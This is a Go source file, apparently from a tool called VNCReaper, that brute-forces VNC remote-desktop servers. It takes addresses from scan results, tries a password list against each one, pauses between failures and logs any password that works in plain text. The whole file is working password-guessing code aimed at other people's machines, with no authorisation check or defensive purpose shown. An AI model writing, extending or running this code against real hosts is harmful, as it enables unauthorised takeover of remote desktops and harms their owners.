package brute

import (
	"fmt"
	"log"
	"time"

	vnc "github.com/amitbet/vnc2video"
	"github.com/comedymoon/VNCReaper/internal/types"
)

// BruteManager holds the password list and retry logic
type BruteManager struct {
	passwords []string
	retries   map[string]int
	maxRetry  int
	waitTime  time.Duration
}

// NewBruteManager creates a new manager
func NewBruteManager(passwords []string) *BruteManager {
	return &BruteManager{
		passwords: passwords,
		retries:   make(map[string]int),
		maxRetry:  3,
		waitTime:  10 * time.Second,
	}
}

// TryAll tries all passwords against the given VNC target
func (bm *BruteManager) TryAll(target types.ScanResult) {
	addr := fmt.Sprintf("%s:%s", target.IP, target.Port)

	if bm.retries[addr] >= bm.maxRetry {
		log.Printf("[BRUTE] Skipping %s, max retries reached", addr)
		return
	}

	for _, pwd := range bm.passwords {
		ok := bm.tryPassword(addr, pwd)
		if ok {
			log.Printf("[BRUTE] SUCCESS %s password: %s", addr, pwd)
			return
		} else {
			bm.retries[addr]++
			log.Printf("[BRUTE] FAIL %s password: %s (retry %d/%d)", addr, pwd, bm.retries[addr], bm.maxRetry)
			time.Sleep(bm.waitTime)
			if bm.retries[addr] >= bm.maxRetry {
				log.Printf("[BRUTE] Giving up on %s", addr)
				return
			}
		}
	}
}

func (bm *BruteManager) tryPassword(addr string, password string) bool {
	cfg := &vnc.ClientConfig{
		Auth: []vnc.ClientAuth{
			&vnc.PasswordAuth{Password: password},
		},
	}

	conn, err := vnc.Dial(addr, cfg)
	if err != nil {
		return false
	}
	defer conn.Close()
	return true
}